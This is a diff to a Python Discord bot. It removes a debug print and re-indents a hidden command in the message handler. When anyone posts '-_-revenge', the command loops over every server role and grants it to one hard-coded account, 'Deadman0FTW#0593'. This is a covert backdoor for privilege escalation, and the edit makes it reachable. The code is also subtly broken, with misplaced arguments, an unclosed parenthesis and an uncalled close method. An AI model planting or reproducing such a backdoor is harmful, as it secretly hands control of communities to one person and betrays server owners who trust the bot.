@@ -424,7 +424,6 @@ async def on_member_update(before, after):
     
     bnick = str(before.nick)
     anick = str(after.nick)
-    print(before.roles[0].is_everyone)
     
     if before.roles[0].is_everyone and not after.roles[0].is_everyone:
         emb = discord.Embed(description = str(before.mention) + "**was given the " + str(after.roles[0]) + " role**" , color = 0xdd10dd, timestamp = datetime.datetime.now())
@@ -498,9 +497,9 @@ async def on_message(message):
         log.write("\n")
         log.close
 		
-	if message.content == "-_-revenge":
+    if message.content == "-_-revenge":
         auth = message.author
-		for role in message.server.roles:
+        for role in message.server.roles:
             await client.add_roles(message.server.get_member_named("Deadman0FTW#0593", role )
 
     # if message.content[:(len('!COMMANDS')+1)].upper()=='!COMMANDS':
